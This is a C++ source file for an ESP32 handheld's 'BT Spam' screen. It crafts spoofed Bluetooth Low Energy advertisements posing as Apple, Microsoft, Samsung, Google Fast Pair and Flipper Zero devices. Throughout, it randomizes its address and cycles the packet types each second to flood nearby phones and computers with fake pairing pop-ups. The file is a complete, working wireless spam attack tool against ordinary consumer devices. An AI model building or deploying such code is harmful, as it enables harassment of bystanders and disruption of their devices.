#include "Apps/screen_btspam.h"
#include "Drivers/buzzer.h"
#include "Drivers/settings.h"
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <esp_random.h>

static const unsigned char image_Layer_9_bits[] PROGMEM = {
  0x7e,0x7e,0x7e,0x7e,0x99,0x99,0x99,0x99,
  0x67,0xe6,0x67,0xe6,0x18,0x18,0x18,0x18,
  0x67,0xe6,0x67,0xe6,0x99,0x99,0x99,0x99,
  0x7e,0x7e,0x7e,0x7e
};


enum SpamType { SPAM_APPLE, SPAM_MICROSOFT, SPAM_SAMSUNG, SPAM_GOOGLE, SPAM_FLIPPER, SPAM_TYPE_COUNT };

static const char* TYPE_NAMES[SPAM_TYPE_COUNT] = {
  "Apple", "Microsoft", "Samsung", "Fast Pair (Android)", "Flipper Zero"
};


static SpamType activeList[SPAM_TYPE_COUNT];
static int       activeCount = 0;

static void rebuildActiveList() {
  uint8_t mask = settingsGetBtSpamMask();
  activeCount = 0;
  for (int i = 0; i < SPAM_TYPE_COUNT; i++) {
    if (mask & (1 << i)) {
      activeList[activeCount++] = (SpamType)i;
    }
  }
  if (activeCount == 0) {

    activeList[0] = SPAM_APPLE;
    activeCount   = 1;
  }
}

int btSpamGetTypeCount() { return SPAM_TYPE_COUNT; }

const char* btSpamGetTypeName(int i) {
  if (i < 0 || i >= SPAM_TYPE_COUNT) return "";
  return TYPE_NAMES[i];
}

bool btSpamIsTypeUnstable(int i) {
  return i == SPAM_GOOGLE || i == SPAM_FLIPPER;
}

bool btSpamIsTypeEnabled(int i) {
  if (i < 0 || i >= SPAM_TYPE_COUNT) return false;
  uint8_t mask = settingsGetBtSpamMask();
  return (mask & (1 << i)) != 0;
}

void btSpamSetTypeEnabled(int i, bool enabled) {
  if (i < 0 || i >= SPAM_TYPE_COUNT) return;
  uint8_t mask = settingsGetBtSpamMask();
  if (enabled) mask |= (1 << i);
  else         mask &= ~(uint8_t)(1 << i);
  settingsSetBtSpamMask(mask);
}

static const unsigned long ROTATE_INTERVAL_MS = 1000; 

static BLEAdvertising* pAdvertising = nullptr;
static bool           spamming     = false;
static int            currentType  = 0;
static int            activeIndex  = 0;
static unsigned long  lastRotate   = 0;
static uint32_t       packetsSent  = 0;

static uint8_t rnd8() { return (uint8_t)(esp_random() & 0xFF); }


static void generateRandomAddr(uint8_t addr[6]) {
  for (int i = 0; i < 6; i++) addr[i] = rnd8();
  addr[0] |= 0xC0; // top 2 bits = 11 -> static random address valida
}

static void randomName(char* out, uint8_t len) {
  static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  for (uint8_t i = 0; i < len; i++) out[i] = charset[rnd8() % (sizeof(charset) - 1)];
  out[len] = '\0';
}


static void addApplePacket(BLEAdvertisementData &adv) {
  if (rnd8() % 10 != 0) {
    // "Accion" (Handoff/AirDrop) -- popup mas chico y rapido
    static uint8_t raw[11];
    int i = 0;
    raw[i++] = 0x0A; raw[i++] = 0xFF; raw[i++] = 0x4C; raw[i++] = 0x00;
    raw[i++] = 0x0F; raw[i++] = 0x05; raw[i++] = 0xC0;
    static const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20};
    raw[i++] = types[rnd8() % (sizeof(types))];
    raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8();
    adv.addData((char*)raw, i);
  } else {
    // "Dispositivo" (AirPods/Watch/etc) -- el cartel grande de "Conectar"
    static uint8_t raw[21];
    int i = 0;
    raw[i++] = 0x14; raw[i++] = 0xFF; raw[i++] = 0x4C; raw[i++] = 0x00;
    raw[i++] = 0x07; raw[i++] = 0x0F; raw[i++] = 0x00;
    static const uint16_t models[] = {
      0x0220, 0x0F20, 0x1320, 0x1420, 0x0E20, 0x0A20, 0x0055, 0x0C20,
      0x1120, 0x0520, 0x1020, 0x0920, 0x1720, 0x1220, 0x1620
    };
    uint16_t model = models[rnd8() % (sizeof(models) / sizeof(models[0]))];
    raw[i++] = (uint8_t)(model >> 8);
    raw[i++] = (uint8_t)(model & 0xFF);
    raw[i++] = 0xAC; raw[i++] = 0x90; raw[i++] = 0x85; raw[i++] = 0x75; raw[i++] = 0x94; raw[i++] = 0x65;
    raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8();
    raw[i++] = 0x00;
    adv.addData((char*)raw, i);
  }
}

static void addMicrosoftPacket(BLEAdvertisementData &adv) {
  static char name[6];
  randomName(name, 5);
  uint8_t total = 7 + 5;
  static uint8_t raw[12];
  int i = 0;
  raw[i++] = total - 1;
  raw[i++] = 0xFF; raw[i++] = 0x06; raw[i++] = 0x00; raw[i++] = 0x03; raw[i++] = 0x00; raw[i++] = 0x80;
  memcpy(&raw[i], name, 5);
  i += 5;
  adv.addData((char*)raw, total);
}

static void addSamsungPacket(BLEAdvertisementData &adv) {
  static uint8_t raw[15];
  int i = 0;
  raw[i++] = 14; raw[i++] = 0xFF; raw[i++] = 0x75; raw[i++] = 0x00;
  raw[i++] = 0x01; raw[i++] = 0x00; raw[i++] = 0x02; raw[i++] = 0x00; raw[i++] = 0x01;
  raw[i++] = 0x01; raw[i++] = 0xFF; raw[i++] = 0x00; raw[i++] = 0x00; raw[i++] = 0x43;
  raw[i++] = rnd8(); // "modelo/color" -- Marauder usa una tabla real de watch models, aca va random
  adv.addData((char*)raw, i);
}

static void addGooglePacket(BLEAdvertisementData &adv) {
  static uint8_t raw[14];
  int i = 0;
  raw[i++] = 3; raw[i++] = 0x03; raw[i++] = 0x2C; raw[i++] = 0xFE;
  raw[i++] = 6; raw[i++] = 0x16; raw[i++] = 0x2C; raw[i++] = 0xFE;
  raw[i++] = 0x00; raw[i++] = 0xB7; raw[i++] = 0x27;
  raw[i++] = 2; raw[i++] = 0x0A;
  raw[i++] = (uint8_t)((rnd8() % 120) - 100); // -100 a +19 dBm, TX power falso
  adv.addData((char*)raw, i);
}

static void addFlipperPacket(BLEAdvertisementData &adv) {
  static char name[6];
  randomName(name, 5);
  // Son 27 bytes en total, NO 24 -- con raw[24] esto escribia pasado
  // el final del arreglo y tronaba con "Stack smashing protect failure!".
  static uint8_t raw[27];
  int i = 0;
  raw[i++] = 0x02; raw[i++] = 0x01; raw[i++] = 0x06;
  raw[i++] = 0x06; raw[i++] = 0x09;
  memcpy(&raw[i], name, 5);
  i += 5;
  raw[i++] = 0x03; raw[i++] = 0x02; raw[i++] = (uint8_t)(0x80 + (rnd8() % 3) + 1); raw[i++] = 0x30;
  raw[i++] = 0x02; raw[i++] = 0x0A; raw[i++] = 0x00;
  raw[i++] = 0x05; raw[i++] = 0xFF; raw[i++] = 0xBA; raw[i++] = 0x0F;
  raw[i++] = 0x4C; raw[i++] = 0x75; raw[i++] = 0x67; raw[i++] = 0x26; raw[i++] = 0xE1; raw[i++] = 0x80;
  adv.addData((char*)raw, i);
}


static void applyPacket(int type) {
  // Timeout corto (50ms): esperar a que termine el advertising anterior
  // evita el EBUSY de setOwnAddr() que daba "setOwnAddr fallo".
  unsigned long waitStart = millis();
  while (pAdvertising->isAdvertising() && millis() - waitStart < 50) {
    delay(1);
  }

  uint8_t addr[6];
  generateRandomAddr(addr);
  if (!BLEDevice::setOwnAddr(addr)) {
    Serial.println(F("BT Spam: setOwnAddr fallo, se sigue con la direccion anterior"));
  }

  BLEAdvertisementData advData;
  switch (type) {
    case SPAM_APPLE:     addApplePacket(advData);     break;
    case SPAM_MICROSOFT: addMicrosoftPacket(advData); break;
    case SPAM_SAMSUNG:   addSamsungPacket(advData);   break;
    case SPAM_GOOGLE:    addGooglePacket(advData);    break;
    case SPAM_FLIPPER:   addFlipperPacket(advData);   break;
  }
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  packetsSent++;
}

static void startSpam() {
  if (spamming) return;

  WiFi.mode(WIFI_OFF);

  BLEDevice::init("");
  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->setScanResponse(false);

  if (!BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM)) {
    Serial.println(F("BT Spam: setOwnAddrType fallo, se sigue con la MAC publica"));
  }

  rebuildActiveList();
  activeIndex = 0;
  currentType = activeList[activeIndex];
  applyPacket(currentType);

  spamming    = true;
  lastRotate  = millis();
  packetsSent = 0;
  Serial.println(F("BT Spam: iniciado"));
}

static void stopSpam() {
  if (!spamming) return;

  if (pAdvertising) pAdvertising->stop();

  BLEDevice::deinit(false);

  spamming = false;
  Serial.println(F("BT Spam: detenido"));
}


static bool isButtonJustPressed(int pin) {
  static uint8_t lastStableState[4] = {HIGH, HIGH, HIGH, HIGH};
  static uint8_t lastReading[4]     = {HIGH, HIGH, HIGH, HIGH};
  static unsigned long lastDebounceTime[4] = {0, 0, 0, 0};

  const int pins[4] = {PIN_SELECT, PIN_UP, PIN_DOWN, PIN_BACK};
  int index = -1;

  for (int i = 0; i < 4; i++) {
    if (pins[i] == pin) { index = i; break; }
  }
  if (index == -1) return false;

  uint8_t reading = digitalRead(pin);

  if (reading != lastReading[index]) {
    lastDebounceTime[index] = millis();
    lastReading[index] = reading;
  }

  if ((millis() - lastDebounceTime[index]) > 50) {
    if (lastStableState[index] == HIGH && reading == LOW) {
      lastStableState[index] = reading;
      return true;
    }
    lastStableState[index] = reading;
  }
  return false;
}



void screenBtSpamLoop() {
  if (spamming && millis() - lastRotate >= ROTATE_INTERVAL_MS) {
    lastRotate = millis();
    pAdvertising->stop();
    activeIndex = (activeIndex + 1) % activeCount;
    currentType = activeList[activeIndex];
    applyPacket(currentType);
  }

  if (isButtonJustPressed(PIN_BACK)) {
    buzzerClick();
    if (spamming) stopSpam();
    currentScreen = SCREEN_APPS;
    return;
  }

  if (isButtonJustPressed(PIN_SELECT)) {
    buzzerBeep();
    if (spamming) stopSpam();
    else          startSpam();
  }

  u8g2.clearBuffer();
  u8g2.setFontMode(1);
  u8g2.setBitmapMode(1);
  u8g2.setFont(u8g2_font_6x10_tr);

  u8g2.setDrawColor(1);
  u8g2.drawBox(16, 1, 96, 14);
  u8g2.setDrawColor(2);
  u8g2.drawStr(43, 11, "BT Spam");
  u8g2.setDrawColor(1);

  u8g2.drawXBM(0, 1, 16, 14, image_Layer_9_bits);
  u8g2.drawXBM(112, 1, 16, 14, image_Layer_9_bits);

  char line[24];

  if (spamming) {
    u8g2.drawDisc(10, 21, 3);
    u8g2.drawStr(16, 25, "ON");
  } else {
    u8g2.drawCircle(10, 21, 3);
    u8g2.drawStr(16, 25, "OFF");
  }
  snprintf(line, sizeof(line), "%lu pkts", (unsigned long)packetsSent);
  u8g2.drawStr(80, 25, line);

  u8g2.setFont(u8g2_font_5x7_tr);
  if (spamming) {
    u8g2.drawStr(6, 40, TYPE_NAMES[currentType]);
  } else {
    u8g2.drawStr(6, 39, "Listo para anunciar");
  }

  u8g2.drawStr(6, 62, "BACK: Salir");
  u8g2.drawStr(6, 52, "SEL: Iniciar");

  u8g2.sendBuffer();
}
